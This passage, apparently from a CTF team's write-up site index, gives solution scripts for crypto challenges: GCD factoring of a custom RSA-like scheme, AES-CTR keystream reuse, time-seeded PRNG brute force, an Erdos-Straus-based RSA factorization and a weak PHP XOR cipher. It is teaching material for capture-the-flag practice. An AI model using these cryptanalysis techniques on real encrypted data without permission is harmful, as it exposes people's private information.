323136689475858283788435297190415326629231841782013470380328322062914421821417044602586721782266492137206976604934554032410738337998164019339195282867579270570771188637636630571301963569622900241602213161396475522976801562853960864577088622021373828937295792222819561111043573007672396987476784672948287600574705736056566374617963948347878220280909003723932805632146024848076789866573232781595349191010186788284504514925388452232227920241883518851862145988532377145521056940790582807479213216240632647108768886842632170415653038740093542869598364804101879631033516030858720540787637217275393603575250765731822252109] p = GCD(g1-1,N) q = GCD(g2-1,N) private = [p,q] print(long_to_bytes(decrypt(enc,private))) Flag: CHTB{Factoring_With_Fermats_Little_Theorem}","title":"Little Nightmares"},{"location":"crypto/CyberApocalypseCTF/Little_Nightmares/#little-nightmares","text":"Solved by: Sowmya (@__4lph4__) Another interesting and number theory challenge from Cyber Apocalypse CTF 2021. Here is the challenge script: from Crypto.Util.number import getPrime, bytes_to_long from random import randint FLAG = b'CHTB{??????????????????????????????????}' flag = bytes_to_long(FLAG) def keygen(): p, q = getPrime(1024), getPrime(1024) N = p*q g, r1, r2 = [randint(1,N) for _ in range(3)] g1, g2 = pow(g, r1*(p-1), N), pow(g, r2*(q-1), N) return [N, g1, g2], [p, q] def encrypt(m, public): N, g1, g2 = public assert m < N, \"Message is too long\" s1, s2 = randint(1,N), randint(1,N) c1 = m*pow(g1,s1,N) % N c2 = m*pow(g2,s2,N) % N return [c1, c2] def decrypt(enc, private): c1, c2 = enc p, q = private m1 = c1 * pow(q, -1, p) * q m2 = c2 * pow(p, -1, q) * p return (m1 + m2) % (p*q) public, private = keygen() enc = encrypt(flag, public) assert flag == decrypt(enc, private) print(f'Public key: {public}') print(f'Encrypted Flag: {enc}') Output: Public key: [15046368688522729878837364795846944447584249939940259042809310309990644722874686184397211078874301515249887625469482926118729767921165680434919436001251916009731653621249173925306213496143518405636216886510423114656445458948673083827223571060637952939874530020017901480576002182201895448100262702822444377134178804257755785230586532510071013644046338971791975792507111644403115625869332161597091770842097004583717690548871004494047953982837491656373096470967389016252220593050830165369469758747361848151735684518721718721910577759955840675047364431973099362772693817698643582567162750607561757926413317531802354973847, 9283319553892803764690461243901070663222428323113425322850741756254277368036028273335428365663191030757323877453365465554132886645468588395631445445583253155195968694862787593653053769030730815589172570039269584478526982112345274390480983685543611640614764128042195018064671336591349166188571572536295612195292864841173479903528383123563226015278849646883506520514470333897880659139687610612049230856991239192330160727258048546502899802982277188877310126410571180236389500463464659397850999622904270520629126455639717497594792781963273264274684421455422023088932590387852813426966580288533263121276557350436900246463, 8170671201621857973407215819397012803619280999847588732628253232283307833188933536560440103969432332185848983745037071025860497584949115721267685519443159539783527315198992420655868110884873218133385835580345201078361745220227561551654718787264374257293351098299807821798471006283753277157555438331734456302990269860368479905882644912688806233577606978042582643369428542665819950283055672363935065844777322370865181261974289403517780920801228770368401030437376412993457855872519154731210534206120823952983817295670102327952847504357905927290367724038039202573992755780477507837498958878434898475866081720566629437645] Encrypted Flag: [7276931928429452854246342065839521806420418866856294154132077445353136752229297971239711445722522895365037966326373464771601590080627182837712349184127450287007143044916049997542062388957038193775059765336324946772584345217059576295657932746876343366393024413356918508539249571136028895868283293788299191933766033783323506852233709102246103073938749386863417754855718482717665887208176012160888333043927323096890710493237011980243014972091979988123240671317403963855512078171350546136813316974298786004332694857700545913951953794486310691251777765023941312078456072442404873687449493571576308437181236785086220324920, 323136689475858283788435297190415326629231841782013470380328322062914421821417044602586721782266492137206976604934554032410738337998164019339195282867579270570771188637636630571301963569622900241602213161396475522976801562853960864577088622021373828937295792222819561111043573007672396987476784672948287600574705736056566374617963948347878220280909003723932805632146024848076789866573232781595349191010186788284504514925388452232227920241883518851862145988532377145521056940790582807479213216240632647108768886842632170415653038740093542869598364804101879631033516030858720540787637217275393603575250765731822252109] This is a customised encryption scheme with paramters N,g1,g2,c1,c2 given. On observing this line in the code: g1, g2 = pow(g, r1*(p-1), N), pow(g, r2*(q-1), N) We get to know that g1 \u2261 1 (mod p) and g2 \u2261 1 (mod q) . Using this we try to get out prime factors. Here's the solution script from Crypto.Util.number import * def decrypt(enc, private): c1, c2 = enc p, q = private m1 = c1 * inverse(q,p) * q m2 = c2 * inverse(p,q) * p return (m1 + m2) % (p*q) N,g1,g2 = [15046368688522729878837364795846944447584249939940259042809310309990644722874686184397211078874301515249887625469482926118729767921165680434919436001251916009731653621249173925306213496143518405636216886510423114656445458948673083827223571060637952939874530020017901480576002182201895448100262702822444377134178804257755785230586532510071013644046338971791975792507111644403115625869332161597091770842097004583717690548871004494047953982837491656373096470967389016252220593050830165369469758747361848151735684518721718721910577759955840675047364431973099362772693817698643582567162750607561757926413317531802354973847, 9283319553892803764690461243901070663222428323113425322850741756254277368036028273335428365663191030757323877453365465554132886645468588395631445445583253155195968694862787593653053769030730815589172570039269584478526982112345274390480983685543611640614764128042195018064671336591349166188571572536295612195292864841173479903528383123563226015278849646883506520514470333897880659139687610612049230856991239192330160727258048546502899802982277188877310126410571180236389500463464659397850999622904270520629126455639717497594792781963273264274684421455422023088932590387852813426966580288533263121276557350436900246463, 8170671201621857973407215819397012803619280999847588732628253232283307833188933536560440103969432332185848983745037071025860497584949115721267685519443159539783527315198992420655868110884873218133385835580345201078361745220227561551654718787264374257293351098299807821798471006283753277157555438331734456302990269860368479905882644912688806233577606978042582643369428542665819950283055672363935065844777322370865181261974289403517780920801228770368401030437376412993457855872519154731210534206120823952983817295670102327952847504357905927290367724038039202573992755780477507837498958878434898475866081720566629437645] enc = [7276931928429452854246342065839521806420418866856294154132077445353136752229297971239711445722522895365037966326373464771601590080627182837712349184127450287007143044916049997542062388957038193775059765336324946772584345217059576295657932746876343366393024413356918508539249571136028895868283293788299191933766033783323506852233709102246103073938749386863417754855718482717665887208176012160888333043927323096890710493237011980243014972091979988123240671317403963855512078171350546136813316974298786004332694857700545913951953794486310691251777765023941312078456072442404873687449493571576308437181236785086220324920, 323136689475858283788435297190415326629231841782013470380328322062914421821417044602586721782266492137206976604934554032410738337998164019339195282867579270570771188637636630571301963569622900241602213161396475522976801562853960864577088622021373828937295792222819561111043573007672396987476784672948287600574705736056566374617963948347878220280909003723932805632146024848076789866573232781595349191010186788284504514925388452232227920241883518851862145988532377145521056940790582807479213216240632647108768886842632170415653038740093542869598364804101879631033516030858720540787637217275393603575250765731822252109] p = GCD(g1-1,N) q = GCD(g2-1,N) private = [p,q] print(long_to_bytes(decrypt(enc,private))) Flag: CHTB{Factoring_With_Fermats_Little_Theorem}","title":"Little Nightmares"},{"location":"crypto/CyberApocalypseCTF/Phase_Stream4/","text":"Phase Stream 4 Solved by: Sowmya (@__4lph4__) This is the last set of the Phase Stream challenges. This challenge involves the cribdragging approach. Here is the challenge script: from Crypto.Cipher import AES from Crypto.Util import Counter import os KEY = os.urandom(16) def encrypt(plaintext): cipher = AES.new(KEY, AES.MODE_CTR, counter=Counter.new(128)) ciphertext = cipher.encrypt(plaintext) return ciphertext.hex() with open('test_quote.txt', 'rb') as f: test_quote = f.read().strip() print(encrypt(test_quote)) with open('flag.txt', 'rb') as f: flag = f.read().strip() print(encrypt(flag)) Output: 2d0fb3a56aa66e1e44cffc97f3a2e030feab144124e73c76d5d22f6ce01c46e73a50b0edc1a2bd243f9578b745438b00720870e3118194cbb438149e3cc9c0844d640ecdb1e71754c24bf43bf3fd0f9719f74c7179b6816e687fa576abad1955 2767868b7ebb7f4c42cfffa6ffbfb03bf3b8097936ae3c76ef803d76e11546947157bcea9599f826338807b55655a05666446df20c8e9387b004129e10d18e9f526f71cabcf21b48965ae36fcfee1e820cf1076f65 Points to be noted: 1. We are given 2 ciphertexts: 1. Ciphertext of the flag 2. Ciphertext of the quote 2. We know the flag format \"CHTB{\" 3. Key is reused in AES-CTR which reduces its strength to that of XOR We first XOR both the ciphertexts to remove the effect of the key. Now we use the flag format CHTB{ to get the initial part of the quote. Through some guessing and googling we have to figure out the quote little by little. Challenge name is also helpful in guessing some part of the flag. Flag: CHTB{stream_ciphers_with_reused_keystreams_are_vulnerable_to_known_plaintext_attacks}","title":"Phase Stream 4"},{"location":"crypto/CyberApocalypseCTF/Phase_Stream4/#phase-stream-4","text":"Solved by: Sowmya (@__4lph4__) This is the last set of the Phase Stream challenges. This challenge involves the cribdragging approach. Here is the challenge script: from Crypto.Cipher import AES from Crypto.Util import Counter import os KEY = os.urandom(16) def encrypt(plaintext): cipher = AES.new(KEY, AES.MODE_CTR, counter=Counter.new(128)) ciphertext = cipher.encrypt(plaintext) return ciphertext.hex() with open('test_quote.txt', 'rb') as f: test_quote = f.read().strip() print(encrypt(test_quote)) with open('flag.txt', 'rb') as f: flag = f.read().strip() print(encrypt(flag)) Output: 2d0fb3a56aa66e1e44cffc97f3a2e030feab144124e73c76d5d22f6ce01c46e73a50b0edc1a2bd243f9578b745438b00720870e3118194cbb438149e3cc9c0844d640ecdb1e71754c24bf43bf3fd0f9719f74c7179b6816e687fa576abad1955 2767868b7ebb7f4c42cfffa6ffbfb03bf3b8097936ae3c76ef803d76e11546947157bcea9599f826338807b55655a05666446df20c8e9387b004129e10d18e9f526f71cabcf21b48965ae36fcfee1e820cf1076f65 Points to be noted: 1. We are given 2 ciphertexts: 1. Ciphertext of the flag 2. Ciphertext of the quote 2. We know the flag format \"CHTB{\" 3. Key is reused in AES-CTR which reduces its strength to that of XOR We first XOR both the ciphertexts to remove the effect of the key. Now we use the flag format CHTB{ to get the initial part of the quote. Through some guessing and googling we have to figure out the quote little by little. Challenge name is also helpful in guessing some part of the flag. Flag: CHTB{stream_ciphers_with_reused_keystreams_are_vulnerable_to_known_plaintext_attacks}","title":"Phase Stream 4"},{"location":"crypto/CyberApocalypseCTF/Soul_Crabber/","text":"Soul Crabber Solved by: Sowmya (@__4lph4__) , Ashwathi (@Ashwathi_sasi) , Namitha (@N4m1th4_01) The rust code takes input and xor's it with random numbers. Since the seed is same, the series of random numbers generated is same each. So we could run it against a dummy input and xor it with the output to get the series of random no. generated. This array when xored with the given output will give us the flag Solution Script: f2 = [] dummy_out = \"296625b4d4823f73ddd35926ed1839d44c381878c6e19969620e99e36b196f\" dummy_in = \"qwertyuiopasdfghjklzxcvbnmqwe\" for i in range(0,len(dummy_out),2): f2.append(int(\"0x\"+dummy_out[i:i+2],16)) rand_arr = [] for i in range(len(dummy_in)): rand_arr.append((f2[i])^ord(dummy_in[i])) fout = \"1b591484db962f7782d1410afa4a388f7930067bcef6df546a57d9f873\" fo2 = [] for i in range(0,len(fout),2): fo2.append(int(\"0x\"+fout[i:i+2],16)) f= \"\" for i in range(len(rand_arr)): f=f+chr(fo2[i]^rand_arr[i]) print(f) Flag: CHTB{mem0ry_s4f3_crypt0_f41l}","title":"Soul Crabber"},{"location":"crypto/CyberApocalypseCTF/Soul_Crabber/#soul-crabber","text":"Solved by: Sowmya (@__4lph4__) , Ashwathi (@Ashwathi_sasi) , Namitha (@N4m1th4_01) The rust code takes input and xor's it with random numbers. Since the seed is same, the series of random numbers generated is same each. So we could run it against a dummy input and xor it with the output to get the series of random no. generated. This array when xored with the given output will give us the flag Solution Script: f2 = [] dummy_out = \"296625b4d4823f73ddd35926ed1839d44c381878c6e19969620e99e36b196f\" dummy_in = \"qwertyuiopasdfghjklzxcvbnmqwe\" for i in range(0,len(dummy_out),2): f2.append(int(\"0x\"+dummy_out[i:i+2],16)) rand_arr = [] for i in range(len(dummy_in)): rand_arr.append((f2[i])^ord(dummy_in[i])) fout = \"1b591484db962f7782d1410afa4a388f7930067bcef6df546a57d9f873\" fo2 = [] for i in range(0,len(fout),2): fo2.append(int(\"0x\"+fout[i:i+2],16)) f= \"\" for i in range(len(rand_arr)): f=f+chr(fo2[i]^rand_arr[i]) print(f) Flag: CHTB{mem0ry_s4f3_crypt0_f41l}","title":"Soul Crabber"},{"location":"crypto/CyberApocalypseCTF/Soul_Crabber2/","text":"Soul Crabber 2 Solved by: Sowmya (@__4lph4__) , Namitha (@N4m1th4_01) This challenge was similar to it's preceding challenge Soul Crabber but the seed wasn't hardcoded this time. So this is a time based PRNG challenge that should be solved with proper brute force. One issue we faced was that we weren't very familiar with rust, so it took us some time. Here is the challenge script: use rand::{Rng,SeedableRng}; use rand::rngs::StdRng; use std::fs; use std::io::Write; use std::time::SystemTime; fn get_rng() -> StdRng { let seed = SystemTime::now() .duration_since(SystemTime::UNIX_EPOCH) .expect(\"Time is broken\") .as_secs(); return StdRng::seed_from_u64(seed); } fn rand_xor(input : String) -> String { let mut rng = get_rng(); return input .chars() .into_iter() .map(|c| format!(\"{:02x}\", (c as u8 ^ rng.gen::<u8>()))) .collect::<Vec<String>>() .join(\"\"); } fn main() -> std::io::Result<()> { let flag = fs::read_to_string(\"flag.txt\")?; let xored = rand_xor(flag); println!(\"{}\", xored); let mut file = fs::File::create(\"out.txt\")?; file.write(xored.as_bytes())?; Ok(()) } Output: 418a5175c38caf8c1cafa92cde06539d512871605d06b2d01bbc1696f4ff487e9d46ba0b5aaf659807 Using time as the seed is the vulnerability here as only the last few digits are going to be changed in 2 different particular times and therefore, the seed can be bruteforced. In this problem the range to be considered was quite large. Here's the solution script use rand::{Rng, SeedableRng, rngs::StdRng}; use std::fs; use std::io::Write; use std::time::SystemTime; extern crate hex; fn get_rng(seed : u64) -> StdRng { return StdRng::seed_from_u64(seed); } fn rand_xor(input : &Vec<u8>,seed:u64) -> String { let mut rng = get_rng(seed); return input .into_iter() .map(|c| format!(\"{:02x}\", (c as &u8 ^ rng.gen::<u8>()))) .collect::<Vec<String>>() .join(\"\"); } fn main() -> std::io::Result<()> { let mut seed=1618000000; let s1 = String::from(\"418a5175c38caf8c1cafa92cde06539d512871605d06b2d01bbc1696f4ff487e9d46ba0b5aaf659807\"); let decoded = hex::decode(s1).expect(\"Decoding failed\"); let mut file = fs::File::create(\"out.txt\")?; while seed <1619000000{ let xored = format!(\"{}\\n\", rand_xor(&decoded,seed)); seed +=1; file.write_all(xored.as_bytes())?; } Ok(()) } Flag: CHTB{cl4551c_ch4ll3ng3_r3wr1tt3n_1n_ru5t}","title":"Soul Crabber 2"},{"location":"crypto/CyberApocalypseCTF/Soul_Crabber2/#soul-crabber-2","text":"Solved by: Sowmya (@__4lph4__) , Namitha (@N4m1th4_01) This challenge was similar to it's preceding challenge Soul Crabber but the seed wasn't hardcoded this time. So this is a time based PRNG challenge that should be solved with proper brute force. One issue we faced was that we weren't very familiar with rust, so it took us some time. Here is the challenge script: use rand::{Rng,SeedableRng}; use rand::rngs::StdRng; use std::fs; use std::io::Write; use std::time::SystemTime; fn get_rng() -> StdRng { let seed = SystemTime::now() .duration_since(SystemTime::UNIX_EPOCH) .expect(\"Time is broken\") .as_secs(); return StdRng::seed_from_u64(seed); } fn rand_xor(input : String) -> String { let mut rng = get_rng(); return input .chars() .into_iter() .map(|c| format!(\"{:02x}\", (c as u8 ^ rng.gen::<u8>()))) .collect::<Vec<String>>() .join(\"\"); } fn main() -> std::io::Result<()> { let flag = fs::read_to_string(\"flag.txt\")?; let xored = rand_xor(flag); println!(\"{}\", xored); let mut file = fs::File::create(\"out.txt\")?; file.write(xored.as_bytes())?; Ok(()) } Output: 418a5175c38caf8c1cafa92cde06539d512871605d06b2d01bbc1696f4ff487e9d46ba0b5aaf659807 Using time as the seed is the vulnerability here as only the last few digits are going to be changed in 2 different particular times and therefore, the seed can be bruteforced. In this problem the range to be considered was quite large. Here's the solution script use rand::{Rng, SeedableRng, rngs::StdRng}; use std::fs; use std::io::Write; use std::time::SystemTime; extern crate hex; fn get_rng(seed : u64) -> StdRng { return StdRng::seed_from_u64(seed); } fn rand_xor(input : &Vec<u8>,seed:u64) -> String { let mut rng = get_rng(seed); return input .into_iter() .map(|c| format!(\"{:02x}\", (c as &u8 ^ rng.gen::<u8>()))) .collect::<Vec<String>>() .join(\"\"); } fn main() -> std::io::Result<()> { let mut seed=1618000000; let s1 = String::from(\"418a5175c38caf8c1cafa92cde06539d512871605d06b2d01bbc1696f4ff487e9d46ba0b5aaf659807\"); let decoded = hex::decode(s1).expect(\"Decoding failed\"); let mut file = fs::File::create(\"out.txt\")?; while seed <1619000000{ let xored = format!(\"{}\\n\", rand_xor(&decoded,seed)); seed +=1; file.write_all(xored.as_bytes())?; } Ok(()) } Flag: CHTB{cl4551c_ch4ll3ng3_r3wr1tt3n_1n_ru5t}","title":"Soul Crabber 2"},{"location":"crypto/CyberApocalypseCTF/Wii_Phit/","text":"Wii Phit Solved by: Sowmya (@__4lph4__) This was an interesting challenge from Cyber Apocalypse CTF 2021. This challenge is based on Number Theory and I really liked the way this challenge was created. Here's the challenge script for understanding the challenge: from Crypto.Util.number import bytes_to_long from secrets import FLAG,p,q N = p**3 * q e = 0x10001 c = pow(bytes_to_long(FLAG),e,N) print(f'Flag: {hex(c)}') # Hint w = 25965460884749769384351428855708318685345170011800821829011862918688758545847199832834284337871947234627057905530743956554688825819477516944610078633662855 x = p + 1328 y = p + 1329 z = q - 1 assert w*(x*z + y*z - x*y) == 4*x*y*z Parameter given to us: Flag: 0x12f47f77c4b5a72a0d14a066fedc80ba6064058c900a798f1658de60f13e1d8f21106654c4aac740fd5e2d7cf62f0d3284c2686d2aac261e35576df989185fee449c20efa171ff3d168a04bce84e51af255383a59ed42583e93481cbfb24fddda16e0a767bff622a4753e1a5df248af14c9ad50f842be47ebb930604becfd4af04d21c0b2248a16cdee16a04b4a12ac7e2161cb63e2d86999a1a8ed2a8faeb4f4986c2a3fbd5916effb1d9f3f04e330fdd8179ea6952b14f758d385c4bc9c5ae30f516c17b23c7c6b9dbe40e16e90d8734baeb69fed12149174b22add6b96750e4416ca7addf70bcec9210b967991e487a4542899dde3abf3a91bbbaeffae67831c46c2238e6e5f4d8004543247fae7ff25bbb01a1ab3196d8a9cfd693096aabec46c2095f2a82a408f688bbedddc407b328d4ea5394348285f48afeaafacc333cff3822e791b9940121b73f4e31c93c6b72ba3ede7bba87419b154dc6099ec95f56ed74fb5c55d9d8b3b8c0fc7de99f344beb118ac3d4333eb692710eaa7fd22 Getting into my initial approach, I first tried elaborating this: assert w*(x*z + y*z - x*y) == 4*x*y*z thinking that it would give me a relation in one of the primes of the modulus. But that didn't work out. On staring at the equation for sometime, I found it similar to one the maths algebra kind of relation. Rearranging the equation gave me this equation: 4/w = 1/x + 1/y - 1/z I searched for similar equations on the internet and I luckily found this According to the above link w = n x = (n-1)/2 y = (n+1)/2 z = n(n-1)(n+1)/4 Once we get x,y,z we can simply get the prime factors p,q with which we can construct Modulus N and phi(n) to solve the RSA problem. Solution script: from Crypto.Util.number import * w = 25965460884749769384351428855708318685345170011800821829011862918688758545847199832834284337871947234627057905530743956554688825819477516944610078633662855 flag = 0x12f47f77c4b5a72a0d14a066fedc80ba6064058c900a798f1658de60f13e1d8f21106654c4aac740fd5e2d7cf62f0d3284c2686d2aac261e35576df989185fee449c20efa171ff3d168a04bce84e51af255383a59ed42583e93481cbfb24fddda16e0a767bff622a4753e1a5df248af14c9ad50f842be47ebb930604becfd4af04d21c0b2248a16cdee16a04b4a12ac7e2161cb63e2d86999a1a8ed2a8faeb4f4986c2a3fbd5916effb1d9f3f04e330fdd8179ea6952b14f758d385c4bc9c5ae30f516c17b23c7c6b9dbe40e16e90d8734baeb69fed12149174b22add6b96750e4416ca7addf70bcec9210b967991e487a4542899dde3abf3a91bbbaeffae67831c46c2238e6e5f4d8004543247fae7ff25bbb01a1ab3196d8a9cfd693096aabec46c2095f2a82a408f688bbedddc407b328d4ea5394348285f48afeaafacc333cff3822e791b9940121b73f4e31c93c6b72ba3ede7bba87419b154dc6099ec95f56ed74fb5c55d9d8b3b8c0fc7de99f344beb118ac3d4333eb692710eaa7fd22 x = (w-1)//2 y = (w+1)//2 z = w*x*y p = x - 1328 q = z + 1 N = p**3 * q e = 65537 phin = (p-1)*(p**2)*(q-1) d = inverse(e,phin) flag = long_to_bytes(pow(flag,d,N)) print(flag) On running the script, we get the flag: CHTB{Erdos-Straus-Conjecture}","title":"Wii Phit"},{"location":"crypto/CyberApocalypseCTF/Wii_Phit/#wii-phit","text":"Solved by: Sowmya (@__4lph4__) This was an interesting challenge from Cyber Apocalypse CTF 2021. This challenge is based on Number Theory and I really liked the way this challenge was created. Here's the challenge script for understanding the challenge: from Crypto.Util.number import bytes_to_long from secrets import FLAG,p,q N = p**3 * q e = 0x10001 c = pow(bytes_to_long(FLAG),e,N) print(f'Flag: {hex(c)}') # Hint w = 25965460884749769384351428855708318685345170011800821829011862918688758545847199832834284337871947234627057905530743956554688825819477516944610078633662855 x = p + 1328 y = p + 1329 z = q - 1 assert w*(x*z + y*z - x*y) == 4*x*y*z Parameter given to us: Flag: 0x12f47f77c4b5a72a0d14a066fedc80ba6064058c900a798f1658de60f13e1d8f21106654c4aac740fd5e2d7cf62f0d3284c2686d2aac261e35576df989185fee449c20efa171ff3d168a04bce84e51af255383a59ed42583e93481cbfb24fddda16e0a767bff622a4753e1a5df248af14c9ad50f842be47ebb930604becfd4af04d21c0b2248a16cdee16a04b4a12ac7e2161cb63e2d86999a1a8ed2a8faeb4f4986c2a3fbd5916effb1d9f3f04e330fdd8179ea6952b14f758d385c4bc9c5ae30f516c17b23c7c6b9dbe40e16e90d8734baeb69fed12149174b22add6b96750e4416ca7addf70bcec9210b967991e487a4542899dde3abf3a91bbbaeffae67831c46c2238e6e5f4d8004543247fae7ff25bbb01a1ab3196d8a9cfd693096aabec46c2095f2a82a408f688bbedddc407b328d4ea5394348285f48afeaafacc333cff3822e791b9940121b73f4e31c93c6b72ba3ede7bba87419b154dc6099ec95f56ed74fb5c55d9d8b3b8c0fc7de99f344beb118ac3d4333eb692710eaa7fd22 Getting into my initial approach, I first tried elaborating this: assert w*(x*z + y*z - x*y) == 4*x*y*z thinking that it would give me a relation in one of the primes of the modulus. But that didn't work out. On staring at the equation for sometime, I found it similar to one the maths algebra kind of relation. Rearranging the equation gave me this equation: 4/w = 1/x + 1/y - 1/z I searched for similar equations on the internet and I luckily found this According to the above link w = n x = (n-1)/2 y = (n+1)/2 z = n(n-1)(n+1)/4 Once we get x,y,z we can simply get the prime factors p,q with which we can construct Modulus N and phi(n) to solve the RSA problem. Solution script: from Crypto.Util.number import * w = 25965460884749769384351428855708318685345170011800821829011862918688758545847199832834284337871947234627057905530743956554688825819477516944610078633662855 flag = 0x12f47f77c4b5a72a0d14a066fedc80ba6064058c900a798f1658de60f13e1d8f21106654c4aac740fd5e2d7cf62f0d3284c2686d2aac261e35576df989185fee449c20efa171ff3d168a04bce84e51af255383a59ed42583e93481cbfb24fddda16e0a767bff622a4753e1a5df248af14c9ad50f842be47ebb930604becfd4af04d21c0b2248a16cdee16a04b4a12ac7e2161cb63e2d86999a1a8ed2a8faeb4f4986c2a3fbd5916effb1d9f3f04e330fdd8179ea6952b14f758d385c4bc9c5ae30f516c17b23c7c6b9dbe40e16e90d8734baeb69fed12149174b22add6b96750e4416ca7addf70bcec9210b967991e487a4542899dde3abf3a91bbbaeffae67831c46c2238e6e5f4d8004543247fae7ff25bbb01a1ab3196d8a9cfd693096aabec46c2095f2a82a408f688bbedddc407b328d4ea5394348285f48afeaafacc333cff3822e791b9940121b73f4e31c93c6b72ba3ede7bba87419b154dc6099ec95f56ed74fb5c55d9d8b3b8c0fc7de99f344beb118ac3d4333eb692710eaa7fd22 x = (w-1)//2 y = (w+1)//2 z = w*x*y p = x - 1328 q = z + 1 N = p**3 * q e = 65537 phin = (p-1)*(p**2)*(q-1) d = inverse(e,phin) flag = long_to_bytes(pow(flag,d,N)) print(flag) On running the script, we get the flag: CHTB{Erdos-Straus-Conjecture}","title":"Wii Phit"},{"location":"crypto/CyberApocalypseCTF/Phasestream3/readme/","text":"Phasestream3 Description On looking at phasestream3.py, we get to know that key used for AES-CTR is reused, which makes it similar to XOR. We also have a known plaintext and the ciphertext of it, using which we find the key. The key found here is used for decrypting the flag. Ciphertext of known plaintext: 464851522838603926f4422a4ca6d81b02f351b454e6f968a324fcc77da30cf979eec57c8675de3bb92f6c21730607066226780a8d4539fcf67f9f5589d150a6c7867140b5a63de2971dc209f480c270882194f288167ed910b64cf627ea6392456fa1b648afd0b239b59652baedc595d4f87634cf7ec4262f8c9581d7f56dc6f836cfe696518ce434ef4616431d4d1b361c Ciphertext of flag: 4b6f25623a2d3b3833a8405557e7e83257d360a054c2ea flag = CHTB{r3u53d_k3Y_4TT4cK}","title":"Readme"},{"location":"crypto/CyberApocalypseCTF/Phasestream3/readme/#phasestream3","text":"","title":"Phasestream3"},{"location":"crypto/CyberApocalypseCTF/Phasestream3/readme/#description","text":"On looking at phasestream3.py, we get to know that key used for AES-CTR is reused, which makes it similar to XOR. We also have a known plaintext and the ciphertext of it, using which we find the key. The key found here is used for decrypting the flag. Ciphertext of known plaintext: 464851522838603926f4422a4ca6d81b02f351b454e6f968a324fcc77da30cf979eec57c8675de3bb92f6c21730607066226780a8d4539fcf67f9f5589d150a6c7867140b5a63de2971dc209f480c270882194f288167ed910b64cf627ea6392456fa1b648afd0b239b59652baedc595d4f87634cf7ec4262f8c9581d7f56dc6f836cfe696518ce434ef4616431d4d1b361c Ciphertext of flag: 4b6f25623a2d3b3833a8405557e7e83257d360a054c2ea flag = CHTB{r3u53d_k3Y_4TT4cK}","title":"Description"},{"location":"crypto/TamuCTF/ciphper/","text":"Ciphper Solved by: Sowmya (@__4lph4__) Description: Background story: this code was once used on a REAL site to encrypt REAL data. Thankfully, this code is no longer being used and has not for a long time. A long time ago, one of the sites I was building needed to store some some potentially sensitive data. I did not know how to use any proper encryption techniques, so I wrote my own symmetric cipher. The encrypted content in output.bin is a well-known, olde English quote in lowercase ASCII alphabetic characters. No punctuation; just letters and spaces. The flag is key to understanding this message. Take a look at the challenge script for better understanding: <?php function secure_crypt($str, $key) { if (!$key) { return $str; } if (strlen($key) < 8) { exit(\"key error\"); } $n = strlen($key) < 32 ? strlen($key) : 32; for ($i = 0; $i < strlen($str); $i++) { $str[$i] = chr(ord($str[$i]) ^ (ord($key[$i % $n]) & 0x1F)); } return $str; } Output: sf'gh;k}.zqf/xc>{j5fvnc.wp2mxq/lrltqdtj/y|{fgi~>mff2p`ub{q2p~4{ub)jlc\u007f${a4mgijil9{}w>|{gpda9qzk=f{ujzh$`h4qg{~my|``a>ix|jv||0{}=sf'qlpa/ofsa/mk\u007fpaff>n7}{b2vv4{oh|eihh$n`p>pv,cni`f{ph7kpg2mxqb Through the code given, it can be understood that this is a classical multi byte xor with a small modification. Observe the line: $str[$i] = chr(ord($str[$i]) ^ (ord($key[$i % $n]) & 0x1F)); Other than the XOR operation there is an extra AND operation. On some observation I found that this AND operation converts ord(a) to 1 , ord(b) to 2 , ord(c) to 3 .. Next, I used the flag format 'gigem{' to find the first few characters of the quote. After getting the quote characters, some googling helped me in finding the correct quote which I used for finding the key. Key found is random bytes because of &0x1f . It was further decoded to get the flag bytes. Doing all this gave me the flag as: gigem{dont\\^roll\\^your\\^own\\^crypto} which wasn't correct on submission. Finally, I understood that ^ and ~ give the same output due to the AND operation. So after changing ^ characters to ~ gave me the flag. Flag: gigem{dont~roll~your~own~crypto}","title":"Ciphper"},{"location":"crypto/TamuCTF/ciphper/#ciphper","text":"Solved by: Sowmya (@__4lph4__) Description: Background story: this code was once used on a REAL site to encrypt REAL data. Thankfully, this code is no longer being used and has not for a long time. A long time ago, one of the sites I was building needed to store some some potentially sensitive data. I did not know how to use any proper encryption techniques, so I wrote my own symmetric cipher. The encrypted content in output.bin is a well-known, olde English quote in lowercase ASCII alphabetic characters. No punctuation; just letters and spaces. The flag is key to understanding this message. Take a look at the challenge script for better understanding: <?php function secure_crypt($str, $key) { if (!$key) { return $str; } if (strlen($key) < 8) { exit(\"key error\"); } $n = strlen($key) < 32 ? strlen($key) : 32; for ($i = 0; $i < strlen($str); $i++) { $str[$i] = chr(ord($str[$i]) ^ (ord($key[$i % $n]) & 0x1F)); } return $str; } Output: sf'gh;k}.zqf/xc>{j5fvnc.wp2mxq/lrltqdtj/y|{fgi~>mff2p`ub{q2p~4{ub)jlc\u007f${a4mgijil9{}w>|{gpda9qzk=f{ujzh$`h4qg{~my|``a>ix|jv||0{}=sf'qlpa/ofsa/mk\u007fpaff>n7}{b2vv4{oh|eihh$n`p>pv,cni`f{ph7kpg2mxqb Through the code given, it can be understood that this is a classical multi byte xor with a small modification. Observe the line: $str[$i] = chr(ord($str[$i]) ^ (ord($key[$i % $n]) & 0x1F)); Other than the XOR operation there is an extra AND operation. On some observation I found that this AND operation converts ord(a) to 1 , ord(b) to 2 , ord(c) to 3 .. Next, I used the flag format 'gigem{' to find the first few characters of the quote. After getting the quote characters, some googling helped me in finding the correct quote which I used for finding the key. Key found is random bytes because of &0x1f . It was further decoded to get the flag bytes. Doing all this gave me the flag as: gigem{dont\\^roll\\^your\\^own\\^crypto} which wasn't correct on submission. Finally, I understood that ^ and ~ give the same output due to the AND operation. So after changing ^ characters to ~ gave me the flag. Flag: gigem{dont~roll~your~own~crypto}","title":"Ciphper"},{"location":"crypto/TamuCTF/encoding/encod/","text":"ENCODING Description: This is literally the flag but obfuscated through tons of different encoding schemes. data.txt File attached Solution: Simple decoding of the data given in data.txt . The decoding in the order: Octal--> hex--> binary--> base32. Flag: gigem{3nc0ding_1s_n0t_crypt0_428427}","title":"ENCODING"},{"location":"crypto/TamuCTF/encoding/encod/#encoding","text":"","title":"ENCODING"},{"location":"crypto/TamuCTF/encoding/encod/#description","text":"This is literally the flag but obfuscated through tons of different encoding schemes. data.txt File attached","title":"Description:"},{"location":"crypto/TamuCTF/encoding/encod/#solution","text":"Simple decoding of the data given in data.txt . The decoding in the order: Octal--> hex--> binary--> 